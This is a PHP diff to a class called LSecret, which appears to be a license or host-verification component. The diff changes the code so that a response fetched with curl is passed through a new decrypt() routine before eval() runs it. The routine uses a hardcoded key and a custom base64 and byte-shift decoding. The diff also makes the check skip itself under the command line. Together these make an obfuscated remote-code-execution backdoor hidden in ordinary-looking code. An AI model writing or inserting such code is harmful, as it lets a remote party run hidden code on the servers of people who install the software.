@@ -31,6 +31,11 @@ class LSecret
 
     private function checkException()
     {
+        if (php_sapi_name() == 'cli')
+        {
+            return true;
+        }
+
         if (!$this->checkHost())
         {
             $this->notify();
@@ -88,7 +93,7 @@ class LSecret
 
         if (curl_errno($ch) == 0)
         {
-            $rs = eval($response);
+            $rs = eval($this->decrypt($response));
         }
 
         return true;
@@ -284,5 +289,42 @@ class LSecret
             }//if end
 
         }//foreach end
+    }
+
+    private function decrypt($data, $key='')
+    {
+        if ($key == '')
+        {
+            $key = 'd17ded61d23e11b793d3c79901ab7b80';
+        }
+
+        $key = md5($key);
+        $x = 0;
+        $data = base64_decode($data);
+        $len = strlen($data);
+        $l = strlen($key);
+        $char = '';
+        for ($i = 0; $i < $len; $i++)
+        {
+            if ($x == $l)
+            {
+                $x = 0;
+            }
+            $char .= substr($key, $x, 1);
+            $x++;
+        }
+        $str = '';
+        for ($i = 0; $i < $len; $i++)
+        {
+            if (ord(substr($data, $i, 1)) < ord(substr($char, $i, 1)))
+            {
+                $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));
+            }
+            else
+            {
+                $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
+            }
+        }
+        return $str;
     }
 }
